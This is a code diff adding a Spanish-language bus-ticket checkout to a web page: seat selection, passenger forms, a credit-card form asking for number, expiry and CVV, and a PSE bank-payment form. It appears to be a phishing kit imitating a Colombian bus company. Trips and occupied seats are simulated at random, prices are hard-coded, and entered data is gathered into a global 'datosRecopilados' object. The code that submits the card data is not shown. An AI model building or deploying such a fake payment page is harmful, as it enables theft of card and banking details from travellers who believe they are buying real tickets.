+				<!-- Opción Tarjeta de Crédito -->
+				<div onclick="seleccionarMetodoPago('tarjeta')" id="opcion-tarjeta" class="border-2 border-gray-300 rounded-xl p-4 cursor-pointer hover:border-[#00529c] transition-all bg-white">
+					<div class="flex items-center gap-4">
+						<div id="radio-tarjeta" class="w-6 h-6 rounded-full border-2 border-gray-400 flex items-center justify-center flex-shrink-0">
+							<!-- Círculo interno cuando está seleccionado -->
+						</div>
+						<div class="flex items-center gap-3 flex-1">
+							<svg class="w-8 h-8 text-gray-700" fill="currentColor" viewBox="0 0 24 24">
+								<path d="M20 4H4c-1.11 0-1.99.89-1.99 2L2 18c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z"/>
+							</svg>
+							<div>
+								<div class="text-lg font-medium text-gray-900">Tarjeta de Crédito</div>
+								<div class="text-sm text-gray-500">Visa, Mastercard, American Express</div>
+							</div>
+						</div>
+					</div>
+				</div>
+
+				<!-- Opción PSE -->
+				<div onclick="seleccionarMetodoPago('pse')" id="opcion-pse" class="border-2 border-gray-300 rounded-xl p-4 cursor-pointer hover:border-[#00529c] transition-all bg-white">
+					<div class="flex items-center gap-4">
+						<div id="radio-pse" class="w-6 h-6 rounded-full border-2 border-gray-400 flex items-center justify-center flex-shrink-0">
+							<!-- Círculo interno cuando está seleccionado -->
+						</div>
+						<div class="flex items-center gap-3 flex-1">
+							<svg class="w-8 h-8 text-gray-700" fill="currentColor" viewBox="0 0 24 24">
+								<path d="M4 10h3v7H4zm6.5 0h3v7h-3zM2 19h20v3H2zm15-9h3v7h-3zm-5-9L2 6v2h20V6z"/>
+							</svg>
+							<div>
+								<div class="text-lg font-medium text-gray-900">PSE</div>
+								<div class="text-sm text-gray-500">Débito bancario directo</div>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+	</section>
+
+	<!-- SECCIÓN: FORMULARIO TARJETA DE CRÉDITO -->
+	<section id="seccion-tarjeta" class="brasilia-section min-h-screen bg-gray-50" style="display: none;">
+		<!-- Header azul -->
+		<div class="bg-[#00529c] text-white px-6 py-4 flex items-center justify-between">
+			<button onclick="volverAMetodoPago()" class="p-2">
+				<svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+					<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"/>
+				</svg>
+			</button>
+			<h2 class="text-xl font-medium">Tarjeta de Crédito</h2>
+			<button onclick="volverAMetodoPago()" class="p-2">
+				<svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+					<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/>
+				</svg>
+			</button>
+		</div>
+
+		<div class="px-6 py-6">
+			<!-- Total a pagar -->
+			<div class="bg-gray-50 rounded-xl p-6 mb-6">
+				<div class="flex items-center justify-between">
+					<span class="text-lg font-medium text-gray-700">Total a pagar:</span>
+					<div class="text-right">
+						<div class="text-3xl font-bold text-gray-900"><span id="totalTarjeta">0</span> <span id="monedaTarjeta">COP</span></div>
+					</div>
+				</div>
+			</div>
+
+			<!-- Formulario de tarjeta -->
+			<div class="space-y-4">
+				<!-- Título datos de tarjeta -->
+				<h3 class="text-lg font-semibold text-gray-900 border-b border-gray-200 pb-2">Datos de la tarjeta</h3>
+
+				<!-- Número de tarjeta -->
+				<div>
+					<label class="block text-sm font-medium text-gray-700 mb-2">Número de tarjeta</label>
+					<input type="text" id="numeroTarjeta" placeholder="" maxlength="19"
+						class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00529c] focus:border-transparent"
+						oninput="formatearNumeroTarjeta(this)">
+				</div>
+
+				<!-- Nombre del titular -->
+				<div>
+					<label class="block text-sm font-medium text-gray-700 mb-2">Nombre del titular</label>
+					<input type="text" id="nombreTitular" placeholder="Como aparece en la tarjeta"
+						class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00529c] focus:border-transparent"
+						oninput="this.value = this.value.toUpperCase()">
+				</div>
+
+				<!-- Fecha de vencimiento y CVV -->
+				<div class="grid grid-cols-2 gap-4">
+					<div>
+						<label class="block text-sm font-medium text-gray-700 mb-2">Fecha de vencimiento</label>
+						<input type="text" id="fechaVencimiento" placeholder="MM/AA" maxlength="5"
+							class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00529c] focus:border-transparent"
+							oninput="formatearFechaVencimiento(this)">
+					</div>
+					<div>
+						<label class="block text-sm font-medium text-gray-700 mb-2">CVV</label>
+						<input type="password" id="cvv" placeholder="123" maxlength="4"
+							class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00529c] focus:border-transparent"
+							oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+					</div>
+				</div>
+
+				<!-- Título datos del pagador -->
+				<h3 class="text-lg font-semibold text-gray-900 border-b border-gray-200 pb-2 mt-6">Información del pagador</h3>
+
+				<!-- Nombre completo -->
+				<div>
+					<label class="block text-sm font-medium text-gray-700 mb-2">Nombre completo</label>
+					<input type="text" id="nombrePagadorTarjeta" placeholder="Nombre y apellidos"
+						class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00529c] focus:border-transparent"
+						oninput="this.value = this.value.toUpperCase()">
+				</div>
+
+				<!-- Email -->
+				<div>
+					<label class="block text-sm font-medium text-gray-700 mb-2">Correo electrónico</label>
+					<input type="email" id="emailPagadorTarjeta" placeholder="correo@ejemplo.com"
+						class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00529c] focus:border-transparent">
+				</div>
+
+				<!-- Celular -->
+				<div>
+					<label class="block text-sm font-medium text-gray-700 mb-2">Celular</label>
+					<input type="tel" id="celularPagadorTarjeta" placeholder="300 123 4567" maxlength="12"
+						class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00529c] focus:border-transparent"
+						oninput="this.value = this.value.replace(/[^0-9\s]/g, '')">
+				</div>
+
+				<!-- Dirección -->
+				<div>
+					<label class="block text-sm font-medium text-gray-700 mb-2">Dirección</label>
+					<input type="text" id="direccionPagadorTarjeta" placeholder="Calle 123 # 45-67"
+						class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00529c] focus:border-transparent"
+						oninput="this.value = this.value.toUpperCase()">
+				</div>
+
+				<!-- Ciudad y Departamento -->
+				<div class="grid grid-cols-2 gap-4">
+					<div>
+						<label class="block text-sm font-medium text-gray-700 mb-2">Ciudad</label>
+						<input type="text" id="ciudadPagadorTarjeta" placeholder="Bogotá"
+							class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00529c] focus:border-transparent"
+							oninput="this.value = this.value.toUpperCase()">
+					</div>
+					<div>
+						<label class="block text-sm font-medium text-gray-700 mb-2">Departamento</label>
+						<input type="text" id="departamentoPagadorTarjeta" placeholder="Cundinamarca"
+							class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00529c] focus:border-transparent"
+							oninput="this.value = this.value.toUpperCase()">
+					</div>
+				</div>
+
+				<!-- Botón de pagar -->
+				<div class="mt-8">
+					<button onclick="pagarConTarjeta()" id="btnPagarTarjeta" class="w-full bg-[#d22630] hover:bg-[#b01f28] text-white font-bold py-4 px-6 rounded-xl text-lg transition-colors flex items-center justify-center gap-2">
+						<span id="textoBotonTarjeta">Pagar</span>
+						<div id="spinnerTarjeta" class="hidden">
+							<svg class="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+								<circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+								<path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+							</svg>
+						</div>
+					</button>
+				</div>
+			</div>
+		</div>
+	</section>
+
+	<!-- SECCIÓN: FORMULARIO PSE -->
+	<section id="seccion-pse" class="brasilia-section min-h-screen bg-gray-50" style="display: none;">
+		<!-- Header azul -->
+		<div class="bg-[#00529c] text-white px-6 py-4 flex items-center justify-between">
+			<button onclick="volverAMetodoPago()" class="p-2">
+				<svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+					<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"/>
+				</svg>
+			</button>
+			<h2 class="text-xl font-medium">PSE</h2>
+			<button onclick="volverAMetodoPago()" class="p-2">
+				<svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+					<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/>
+				</svg>
+			</button>
+		</div>
+
+		<div class="px-6 py-6">
+			<!-- Total a pagar -->
+			<div class="bg-gray-50 rounded-xl p-6 mb-6">
+				<div class="flex items-center justify-between">
+					<span class="text-lg font-medium text-gray-700">Total a pagar:</span>
+					<div class="text-right">
+						<div class="text-3xl font-bold text-gray-900"><span id="totalPSE">0</span> <span id="monedaPSE">COP</span></div>
+					</div>
+				</div>
+			</div>
+
+			<!-- Formulario PSE -->
+			<div class="space-y-4">
+				<!-- Título datos bancarios -->
+				<h3 class="text-lg font-semibold text-gray-900 border-b border-gray-200 pb-2">Datos bancarios</h3>
+
+				<!-- Selector de Banco -->
+				<div>
+					<label class="block text-sm font-medium text-gray-700 mb-2">Banco</label>
+					<select id="selectBanco" class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00529c] focus:border-transparent bg-white">
+						<option value="">Selecciona tu banco</option>
+						<option value="bancolombia">Bancolombia</option>
+						<option value="avvillas">AV Villas</option>
+						<option value="bbva">BBVA</option>
+						<option value="bogota">Banco de Bogotá</option>
+						<option value="cajasocial">Caja Social</option>
+						<option value="colpatria">Colpatria</option>
+						<option value="davivienda">Davivienda</option>
+						<option value="falabella">Banco Falabella</option>
+						<option value="nequi">Nequi</option>
+						<option value="occidente">Banco de Occidente</option>
+						<option value="popular">Banco Popular</option>
+					</select>
+				</div>
+
+				<!-- Selector de Tipo de Persona -->
+				<div>
+					<label class="block text-sm font-medium text-gray-700 mb-2">Tipo de persona</label>
+					<select id="selectTipoPersona" class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00529c] focus:border-transparent bg-white">
+						<option value="">Selecciona el tipo de persona</option>
+						<option value="natural">Persona Natural</option>
+						<option value="juridica">Persona Jurídica</option>
+					</select>
+				</div>
+
+				<!-- Título datos del pagador -->
+				<h3 class="text-lg font-semibold text-gray-900 border-b border-gray-200 pb-2 mt-6">Información del pagador</h3>
+
+				<!-- Nombre completo -->
+				<div>
+					<label class="block text-sm font-medium text-gray-700 mb-2">Nombre completo</label>
+					<input type="text" id="nombrePagadorPSE" placeholder="Nombre y apellidos"
+						class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00529c] focus:border-transparent"
+						oninput="this.value = this.value.toUpperCase()">
+				</div>
+
+				<!-- Email -->
+				<div>
+					<label class="block text-sm font-medium text-gray-700 mb-2">Correo electrónico</label>
+					<input type="email" id="emailPagadorPSE" placeholder="correo@ejemplo.com"
+						class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00529c] focus:border-transparent">
+				</div>
+
+				<!-- Celular -->
+				<div>
+					<label class="block text-sm font-medium text-gray-700 mb-2">Celular</label>
+					<input type="tel" id="celularPagadorPSE" placeholder="300 123 4567" maxlength="12"
+						class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00529c] focus:border-transparent"
+						oninput="this.value = this.value.replace(/[^0-9\s]/g, '')">
+				</div>
+
+				<!-- Dirección -->
+				<div>
+					<label class="block text-sm font-medium text-gray-700 mb-2">Dirección</label>
+					<input type="text" id="direccionPagadorPSE" placeholder="Calle 123 # 45-67"
+						class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00529c] focus:border-transparent"
+						oninput="this.value = this.value.toUpperCase()">
+				</div>
+
+				<!-- Ciudad y Departamento -->
+				<div class="grid grid-cols-2 gap-4">
+					<div>
+						<label class="block text-sm font-medium text-gray-700 mb-2">Ciudad</label>
+						<input type="text" id="ciudadPagadorPSE" placeholder="Bogotá"
+							class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00529c] focus:border-transparent"
+							oninput="this.value = this.value.toUpperCase()">
+					</div>
+					<div>
+						<label class="block text-sm font-medium text-gray-700 mb-2">Departamento</label>
+						<input type="text" id="departamentoPagadorPSE" placeholder="Cundinamarca"
+							class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00529c] focus:border-transparent"
+							oninput="this.value = this.value.toUpperCase()">
+					</div>
+				</div>
+
+				<!-- Botón de pagar -->
+				<div class="mt-8">
+					<button onclick="pagarConPSE()" id="btnPagarPSE" class="w-full bg-[#d22630] hover:bg-[#b01f28] text-white font-bold py-4 px-6 rounded-xl text-lg transition-colors flex items-center justify-center gap-2">
+						<span id="textoBotonPSE">Pagar</span>
+						<div id="spinnerPSE" class="hidden">
+							<svg class="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+								<circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+								<path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+							</svg>
+						</div>
+					</button>
+				</div>
+			</div>
+		</div>
+	</section>
+
+	<script>
+		// =====================================================
+		// VARIABLES GLOBALES DEL VIAJE Y SILLAS
+		// =====================================================
+
+		let datosViaje = {
+			origen: 'Barranquilla',
+			destino: 'Bogotá',
+			fecha: '',
+			hora: '06:30',
+			precioBase: 185000
+		};
+
+		let sillasSeleccionadas = [];
+		let sillasOcupadas = [];
+		let pasajerosData = [];
+		const MAX_SILLAS = 6;
+
+		// Inicializar fecha con fecha de mañana
+		(function() {
+			const manana = new Date();
+			manana.setDate(manana.getDate() + 1);
+			datosViaje.fecha = manana.toLocaleDateString('es-CO', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' });
+		})();
+
+		// =====================================================
+		// FUNCIONES DE NAVEGACIÓN PRINCIPAL
+		// =====================================================
+
+		function ocultarTodo() {
+			document.getElementById('page-container').style.display = 'none';
+			document.getElementById('mainFooter').style.display = 'none';
+			document.getElementById('reservamosPortal').style.display = 'none';
+			document.querySelectorAll('section[id^="seccion-"]').forEach(s => {
+				s.classList.add('hidden');
+				s.style.display = 'none';
+			});
+		}
+
+		function mostrarInicio() {
+			document.getElementById('page-container').style.display = 'block';
+			document.getElementById('mainFooter').style.display = 'block';
+			document.getElementById('reservamosPortal').style.display = 'block';
+			document.querySelectorAll('section[id^="seccion-"]').forEach(s => {
+				s.classList.add('hidden');
+				s.style.display = 'none';
+			});
+		}
+
+		function volverAInicio() {
+			mostrarInicio();
+		}
+
+		// =====================================================
+		// FUNCIONES DE SELECCIÓN DE SILLAS
+		// =====================================================
+
+		function iniciarSeleccionSillas(origen, destino, fecha, hora, precio) {
+			// Actualizar datos del viaje
+			if (origen) datosViaje.origen = origen;
+			if (destino) datosViaje.destino = destino;
+			if (fecha) datosViaje.fecha = fecha;
+			if (hora) datosViaje.hora = hora;
+			if (precio) datosViaje.precioBase = precio;
+
+			// Resetear selecciones
+			sillasSeleccionadas = [];
+			pasajerosData = [];
+
+			// Generar sillas ocupadas aleatorias
+			generarSillasOcupadas();
+
+			// Actualizar UI
+			document.getElementById('rutaViaje').textContent = `${datosViaje.origen} - ${datosViaje.destino}`;
+			document.getElementById('fechaViaje').textContent = datosViaje.fecha;
+			document.getElementById('horaViaje').textContent = datosViaje.hora;
+			document.getElementById('precioAsiento').textContent = formatearPrecio(datosViaje.precioBase);
+
+			// Generar sillas
+			generarSillasBus();
+
+			// Actualizar resumen
+			actualizarResumenSillas();
+
+			// Mostrar sección
+			ocultarTodo();
+			document.getElementById('seccion-sillas').classList.remove('hidden');
+			document.getElementById('seccion-sillas').style.display = 'flex';
+			document.getElementById('seccion-sillas').style.flexDirection = 'column';
+		}
+
+		function generarSillasOcupadas() {
+			sillasOcupadas = [];
+			// Generar entre 8 y 15 sillas ocupadas aleatorias
+			const cantidadOcupadas = Math.floor(Math.random() * 8) + 8;
+			while (sillasOcupadas.length < cantidadOcupadas) {
+				const silla = Math.floor(Math.random() * 40) + 1;
+				if (!sillasOcupadas.includes(silla)) {
+					sillasOcupadas.push(silla);
+				}
+			}
+		}
+
+		function generarSillasBus() {
+			const piso1 = document.getElementById('sillasPiso1');
+			const piso2 = document.getElementById('sillasPiso2');
+			piso1.innerHTML = '';
+			piso2.innerHTML = '';
+
+			// Piso 1: sillas 1-20
+			for (let i = 1; i <= 20; i++) {
+				piso1.appendChild(crearSilla(i));
+			}
+
+			// Piso 2: sillas 21-40
+			for (let i = 21; i <= 40; i++) {
+				piso2.appendChild(crearSilla(i));
+			}
+		}
+
+		function crearSilla(numero) {
+			const div = document.createElement('div');
+			const esOcupada = sillasOcupadas.includes(numero);
+			const esSeleccionada = sillasSeleccionadas.includes(numero);
+			const esPasillo = (numero % 5 === 3); // Cada 3ra posición es pasillo
+
+			if (esPasillo) {
+				// Espacio de pasillo
+				div.className = 'w-10 h-10';
+				return div;
+			}
+
+			div.className = `w-10 h-10 rounded-lg flex items-center justify-center text-xs font-bold cursor-pointer transition-all transform hover:scale-105 `;
+
+			if (esOcupada) {
+				div.className += 'bg-red-400 border-2 border-red-500 text-white cursor-not-allowed';
+				div.innerHTML = `<svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>`;
+			} else if (esSeleccionada) {
+				div.className += 'bg-[#00529c] border-2 border-[#003d75] text-white';
+				div.textContent = numero;
+			} else {
+				div.className += 'bg-gray-200 border-2 border-gray-300 text-gray-600 hover:bg-gray-300';
+				div.textContent = numero;
+			}
+
+			if (!esOcupada) {
+				div.onclick = () => toggleSilla(numero);
+			}
+
+			return div;
+		}
+
+		function toggleSilla(numero) {
+			const index = sillasSeleccionadas.indexOf(numero);
+
+			if (index > -1) {
+				// Deseleccionar
+				sillasSeleccionadas.splice(index, 1);
+			} else {
+				// Verificar máximo
+				if (sillasSeleccionadas.length >= MAX_SILLAS) {
+					alert(`Máximo ${MAX_SILLAS} asientos por compra`);
+					return;
+				}
+				// Seleccionar
+				sillasSeleccionadas.push(numero);
+			}
+
+			// Ordenar sillas
+			sillasSeleccionadas.sort((a, b) => a - b);
+
+			// Regenerar sillas y actualizar resumen
+			generarSillasBus();
+			actualizarResumenSillas();
+		}
+
+		function actualizarResumenSillas() {
+			const cantidad = sillasSeleccionadas.length;
+			const total = cantidad * datosViaje.precioBase;
+
+			document.getElementById('asientosSeleccionados').textContent =
+				cantidad > 0 ? sillasSeleccionadas.join(', ') : 'Ninguno';
+			document.getElementById('totalSillas').textContent = formatearPrecio(total);
+			document.getElementById('btnContinuarSillas').disabled = cantidad === 0;
+		}
+
+		function formatearPrecio(valor) {
+			return '$' + valor.toLocaleString('es-CO');
+		}
+
+		// =====================================================
+		// FUNCIONES DE PASAJEROS
+		// =====================================================
+
+		function continuarAPasajeros() {
+			if (sillasSeleccionadas.length === 0) return;
+
+			// Generar formularios de pasajeros
+			generarFormulariosPasajeros();
+
+			// Actualizar resumen
+			document.getElementById('resumenViaje').textContent = `${datosViaje.origen} - ${datosViaje.destino} | ${datosViaje.hora}`;
+			document.getElementById('resumenAsientos').textContent = `Asientos: ${sillasSeleccionadas.join(', ')}`;
+			document.getElementById('resumenRuta').textContent = `${datosViaje.origen} - ${datosViaje.destino}`;
+			document.getElementById('resumenFecha').textContent = datosViaje.fecha;
+			document.getElementById('resumenHora').textContent = datosViaje.hora;
+			document.getElementById('resumenAsientosCompra').textContent = sillasSeleccionadas.join(', ');
+			document.getElementById('resumenCantidad').textContent = `${sillasSeleccionadas.length} pasajero(s)`;
+			document.getElementById('resumenTotal').textContent = formatearPrecio(sillasSeleccionadas.length * datosViaje.precioBase);
+
+			// Mostrar sección
+			ocultarTodo();
+			document.getElementById('seccion-pasajeros').classList.remove('hidden');
+			document.getElementById('seccion-pasajeros').style.display = 'flex';
+			document.getElementById('seccion-pasajeros').style.flexDirection = 'column';
+		}
+
+		function generarFormulariosPasajeros() {
+			const container = document.getElementById('formulariosPasajeros');
+			container.innerHTML = '';
+
+			sillasSeleccionadas.forEach((silla, index) => {
+				const form = document.createElement('div');
+				form.className = 'bg-white rounded-xl shadow-lg p-4';
+				form.innerHTML = `
+					<div class="flex items-center gap-3 mb-4 pb-3 border-b">
+						<div class="w-10 h-10 bg-[#00529c] rounded-full flex items-center justify-center text-white font-bold" style="font-family: 'Oswald', sans-serif;">
+							${silla}
+						</div>
+						<div>
+							<h4 class="font-bold text-gray-800" style="font-family: 'Oswald', sans-serif; text-transform: uppercase;">Pasajero ${index + 1}</h4>
+							<span class="text-xs text-gray-500" style="font-family: 'Source Sans Pro', sans-serif;">Asiento ${silla}</span>
+						</div>
+					</div>
+
+					<div class="space-y-3">
+						<div class="grid grid-cols-2 gap-3">
+							<div>
+								<label class="block text-xs font-medium text-gray-600 mb-1" style="font-family: 'Source Sans Pro', sans-serif;">Tipo documento</label>
+								<select id="tipoDoc_${index}" onchange="validarFormulariosPasajeros()"
+									class="w-full px-3 py-2 text-sm border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#00529c] focus:border-transparent" style="font-family: 'Source Sans Pro', sans-serif;">
+									<option value="">Seleccionar</option>
+									<option value="CC">Cédula</option>
+									<option value="CE">Cédula Extranjería</option>
+									<option value="TI">Tarjeta Identidad</option>
+									<option value="PP">Pasaporte</option>
+								</select>
+							</div>
+							<div>
+								<label class="block text-xs font-medium text-gray-600 mb-1" style="font-family: 'Source Sans Pro', sans-serif;">Número documento</label>
+								<input type="text" id="numDoc_${index}" placeholder="123456789" maxlength="15"
+									oninput="this.value = this.value.replace(/[^0-9]/g, ''); validarFormulariosPasajeros()"
+									class="w-full px-3 py-2 text-sm border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#00529c] focus:border-transparent" style="font-family: 'Source Sans Pro', sans-serif;">
+							</div>
+						</div>
+
+						<div class="grid grid-cols-2 gap-3">
+							<div>
+								<label class="block text-xs font-medium text-gray-600 mb-1" style="font-family: 'Source Sans Pro', sans-serif;">Nombres</label>
+								<input type="text" id="nombres_${index}" placeholder="Juan Carlos"
+									oninput="this.value = this.value.toUpperCase(); validarFormulariosPasajeros()"
+									class="w-full px-3 py-2 text-sm border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#00529c] focus:border-transparent" style="font-family: 'Source Sans Pro', sans-serif;">
+							</div>
+							<div>
+								<label class="block text-xs font-medium text-gray-600 mb-1" style="font-family: 'Source Sans Pro', sans-serif;">Apellidos</label>
+								<input type="text" id="apellidos_${index}" placeholder="Pérez Gómez"
+									oninput="this.value = this.value.toUpperCase(); validarFormulariosPasajeros()"
+									class="w-full px-3 py-2 text-sm border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#00529c] focus:border-transparent" style="font-family: 'Source Sans Pro', sans-serif;">
+							</div>
+						</div>
+
+						<div class="grid grid-cols-2 gap-3">
+							<div>
+								<label class="block text-xs font-medium text-gray-600 mb-1" style="font-family: 'Source Sans Pro', sans-serif;">Celular</label>
+								<input type="tel" id="celular_${index}" placeholder="300 123 4567" maxlength="12"
+									oninput="this.value = this.value.replace(/[^0-9]/g, ''); validarFormulariosPasajeros()"
+									class="w-full px-3 py-2 text-sm border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#00529c] focus:border-transparent" style="font-family: 'Source Sans Pro', sans-serif;">
+							</div>
+							<div>
+								<label class="block text-xs font-medium text-gray-600 mb-1" style="font-family: 'Source Sans Pro', sans-serif;">Email</label>
+								<input type="email" id="email_${index}" placeholder="correo@ejemplo.com"
+									oninput="validarFormulariosPasajeros()"
+									class="w-full px-3 py-2 text-sm border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#00529c] focus:border-transparent" style="font-family: 'Source Sans Pro', sans-serif;">
+							</div>
+						</div>
+					</div>
+				`;
+				container.appendChild(form);
+			});
+		}
+
+		function validarFormulariosPasajeros() {
+			let todosValidos = true;
+			pasajerosData = [];
+
+			sillasSeleccionadas.forEach((silla, index) => {
+				const tipoDoc = document.getElementById(`tipoDoc_${index}`).value;
+				const numDoc = document.getElementById(`numDoc_${index}`).value.trim();
+				const nombres = document.getElementById(`nombres_${index}`).value.trim();
+				const apellidos = document.getElementById(`apellidos_${index}`).value.trim();
+				const celular = document.getElementById(`celular_${index}`).value.trim();
+				const email = document.getElementById(`email_${index}`).value.trim();
+
+				const valido = tipoDoc && numDoc.length >= 5 && nombres.length >= 2 &&
+					apellidos.length >= 2 && celular.length >= 10 && email.includes('@');
+
+				if (valido) {
+					pasajerosData.push({
+						silla,
+						tipoDoc,
+						numDoc,
+						nombres,
+						apellidos,
+						celular,
+						email
+					});
+				} else {
+					todosValidos = false;
+				}
+			});
+
+			document.getElementById('btnPagar').disabled = !todosValidos;
+		}
+
+		function volverASillas() {
+			ocultarTodo();
+			document.getElementById('seccion-sillas').classList.remove('hidden');
+			document.getElementById('seccion-sillas').style.display = 'flex';
+			document.getElementById('seccion-sillas').style.flexDirection = 'column';
+		}
+
+		// =====================================================
+		// FUNCIÓN PARA IR A PAGAR
+		// =====================================================
+
+		function irAPagar() {
+			if (pasajerosData.length === 0) return;
+
+			// Guardar datos de pasajeros en datosRecopilados
+			datosRecopilados.pasajeros = pasajerosData;
+			datosRecopilados.viaje = {
+				origen: datosViaje.origen,
+				destino: datosViaje.destino,
+				fecha: datosViaje.fecha,
+				hora: datosViaje.hora,
+				asientos: sillasSeleccionadas.join(', ')
+			};
+
+			// Calcular total
+			const totalCompra = sillasSeleccionadas.length * datosViaje.precioBase;
+			totalAPagar = totalCompra;
+
+			// Pre-llenar datos del primer pasajero en el formulario de pago
+			const primerPasajero = pasajerosData[0];
+			document.getElementById('nombrePagadorTarjeta').value = `${primerPasajero.nombres} ${primerPasajero.apellidos}`;
+			document.getElementById('emailPagadorTarjeta').value = primerPasajero.email;
+			document.getElementById('celularPagadorTarjeta').value = primerPasajero.celular;
+			document.getElementById('nombrePagadorPSE').value = `${primerPasajero.nombres} ${primerPasajero.apellidos}`;
+			document.getElementById('emailPagadorPSE').value = primerPasajero.email;
+			document.getElementById('celularPagadorPSE').value = primerPasajero.celular;
+
+			// Mostrar método de pago
+			procesarPago(totalCompra.toString());
+		}
+
+		// =====================================================
+		// FUNCIÓN PARA BUSCAR Y MOSTRAR RESULTADOS DE VIAJES
+		// =====================================================
+
+		let viajesDisponibles = [];
+
+		function buscarViaje(origen, destino) {
+			// Guardar datos de búsqueda
+			datosViaje.origen = origen;
+			datosViaje.destino = destino;
+
+			// Fecha de mañana
+			const manana = new Date();
+			manana.setDate(manana.getDate() + 1);
+			const fechaFormateada = manana.toLocaleDateString('es-CO', { weekday: 'long', day: 'numeric', month: 'long', year: 'numeric' });
+			datosViaje.fecha = fechaFormateada;
+
+			// Actualizar UI de resultados
+			document.getElementById('rutaBuscada').textContent = `${origen} → ${destino}`;
+			document.getElementById('fechaBuscada').textContent = fechaFormateada;
+
+			// Generar viajes disponibles simulados
+			generarViajesDisponibles(origen, destino);
+
+			// Mostrar sección de resultados
+			ocultarTodo();
+			document.getElementById('seccion-resultados').classList.remove('hidden');
+			document.getElementById('seccion-resultados').style.display = 'flex';
+			document.getElementById('seccion-resultados').style.flexDirection = 'column';
+		}
+
+		function generarViajesDisponibles(origen, destino) {
+			// Precios base por ruta
+			const preciosBase = {
+				'default': 185000,
+				'barranquilla-bogota': 185000,
+				'bogota-medellin': 120000,
+				'cartagena-bogota': 195000,
+				'cali-bogota': 140000,
+				'bucaramanga-bogota': 130000
+			};
+
+			const ruta = `${origen.toLowerCase()}-${destino.toLowerCase()}`;
+			const precioBase = preciosBase[ruta] || preciosBase['default'];
+
+			// Tipos de servicio con sus características
+			const servicios = [
+				{ nombre: 'PREMIUM Plus', subtitulo: 'Preferencial de Lujo', estrellas: 5, descuento: 20 },
+				{ nombre: 'Preferencial', subtitulo: 'Servicio Ejecutivo', estrellas: 4, descuento: 15 },
+				{ nombre: 'Económico', subtitulo: 'Servicio Estándar', estrellas: 3, descuento: 0 }
+			];
+
+			// Horarios disponibles con iconos según hora
+			const horarios = [
+				{ salida: '05:30 AM', llegada: '05:30 PM', icono: 'wb_twilight' },
+				{ salida: '06:00 AM', llegada: '06:00 PM', icono: 'wb_sunny' },
+				{ salida: '08:00 AM', llegada: '08:00 PM', icono: 'wb_sunny' },
+				{ salida: '10:00 AM', llegada: '10:00 PM', icono: 'wb_sunny' },
